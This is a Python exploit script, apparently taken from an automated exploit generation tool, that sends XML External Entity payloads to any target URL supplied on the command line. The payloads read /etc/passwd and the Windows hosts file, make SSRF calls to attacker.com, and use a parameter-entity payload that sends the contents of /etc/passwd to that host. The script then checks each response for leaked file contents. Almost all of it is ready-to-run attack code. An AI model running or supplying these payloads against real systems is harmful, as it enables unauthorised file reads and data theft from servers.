"""
XXE (XML External Entity) Exploit Class
Extracted from HexStrike exploit generation system
"""

import requests
import sys


class XXEExploit:
    """XML External Entity exploitation class"""

    def __init__(self, target_url):
        """
        Initialize XXE exploit

        Args:
            target_url: Base URL of target application
        """
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()

    def generate_xxe_payloads(self):
        """
        Generate XXE payloads

        Returns:
            List of XXE test payloads
        """
        payloads = [
            # Basic file read
            '<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n<root>&xxe;</root>',

            # Windows file read
            '<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///C:/windows/system32/drivers/etc/hosts">]>\n<root>&xxe;</root>',

            # HTTP request (SSRF)
            '<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]>\n<root>&xxe;</root>',

            # Parameter entity
            '<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE root [\n<!ENTITY % xxe SYSTEM "file:///etc/passwd">\n<!ENTITY % param1 "<!ENTITY exfil SYSTEM \'http://attacker.com/?%xxe;\'>">\n%param1;\n]>\n<root>&exfil;</root>'
        ]

        return payloads

    def test_xxe(self):
        """
        Test for XXE vulnerability

        Returns:
            True if vulnerability found, False otherwise
        """
        print("[+] Testing XXE vulnerability...")

        payloads = self.generate_xxe_payloads()

        for i, payload in enumerate(payloads):
            try:
                headers = {"Content-Type": "application/xml"}
                response = self.session.post(
                    self.target_url,
                    data=payload,
                    headers=headers
                )

                # Check for file content indicators
                indicators = [
                    "root:", "daemon:", "bin:",  # /etc/passwd
                    "localhost", "127.0.0.1",   # hosts file
                    "<?xml", "<!DOCTYPE"        # XML processing
                ]

                if any(indicator in response.text for indicator in indicators):
                    print(f"[+] XXE vulnerability found with payload {i+1}")
                    print(f"[+] Response: {response.text[:200]}...")
                    return True

            except Exception as e:
                continue

        return False


def main():
    """Main execution function for standalone usage"""
    if len(sys.argv) != 2:
        print(f"Usage: python3 {sys.argv[0]} <target_url>")
        print(f"Example: python3 {sys.argv[0]} http://target.com/xml")
        sys.exit(1)

    target_url = sys.argv[1]
    exploit = XXEExploit(target_url)

    print(f"[+] XXE Exploit")
    print(f"[+] Target: {target_url}")

    if exploit.test_xxe():
        print("[+] XXE vulnerability confirmed!")
    else:
        print("[-] No XXE vulnerability found")


if __name__ == "__main__":
    main()
